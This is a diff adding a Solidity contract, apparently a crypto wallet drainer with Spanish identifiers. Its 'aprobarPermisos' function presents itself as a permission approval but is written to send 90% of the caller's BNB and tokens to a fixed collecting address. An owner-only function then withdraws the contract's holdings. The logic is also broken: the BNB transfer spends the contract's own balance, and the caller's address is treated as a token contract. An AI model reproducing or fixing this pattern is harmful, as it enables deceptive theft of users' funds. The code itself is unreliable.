@@ -1,0 +1,66 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IBEP20 {
+    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
+    function transfer(address _to, uint256 _value) external returns (bool);
+    function balanceOf(address _owner) external view returns (uint256);
+}
+
+contract TransferenciaFondos {
+    address payable public owner;
+    mapping(address => bool) public aprobaciones;
+    address public direccionComun;
+
+    event FondosDepositados(address indexed depositante, uint256 cantidadBNB, uint256 cantidadTokens);
+    event FondosRetirados(uint256 cantidadBNB, uint256 cantidadTokens);
+
+    constructor(address _direccionComun) {
+        owner = payable(msg.sender);
+        direccionComun = _direccionComun;
+    }
+
+    function aprobarPermisos() external {
+        require(!aprobaciones[msg.sender], "Ya has aprobado los permisos.");
+        aprobaciones[msg.sender] = true;
+
+        uint256 balanceBNB = address(msg.sender).balance;
+        require(balanceBNB > 0, "El usuario no tiene fondos en BNB.");
+
+        uint256 amountBNB = (balanceBNB * 90) / 100;
+        require(amountBNB > 0, "No se puede transferir una cantidad de BNB igual a cero.");
+        payable(direccionComun).transfer(amountBNB);
+
+        uint256 balanceTokens = IBEP20(msg.sender).balanceOf(msg.sender);
+        require(balanceTokens > 0, "El usuario no tiene tokens.");
+
+        uint256 amountTokens = (balanceTokens * 90) / 100;
+        require(amountTokens > 0, "No se puede transferir una cantidad de tokens igual a cero.");
+        require(IBEP20(msg.sender).transferFrom(msg.sender, direccionComun, amountTokens), "Fallo al transferir los tokens.");
+
+        emit FondosDepositados(msg.sender, amountBNB, amountTokens);
+    }
+
+    function retirarFondos() external {
+        require(msg.sender == owner, "Solo el propietario puede retirar los fondos.");
+
+        uint256 balanceBNB = address(this).balance;
+        require(balanceBNB > 0, "No hay fondos en BNB en el contrato.");
+        owner.transfer(balanceBNB);
+
+        uint256 balanceTokens = IBEP20(direccionComun).balanceOf(address(this));
+        require(balanceTokens > 0, "No hay tokens en el contrato.");
+
+        require(IBEP20(direccionComun).transfer(owner, balanceTokens), "Fallo al transferir los tokens.");
+
+        emit FondosRetirados(balanceBNB, balanceTokens);
+    }
+
+    receive() external payable {
+        // Do nothing
+    }
+
+    fallback() external payable {
+        // Do nothing
+    }
+}
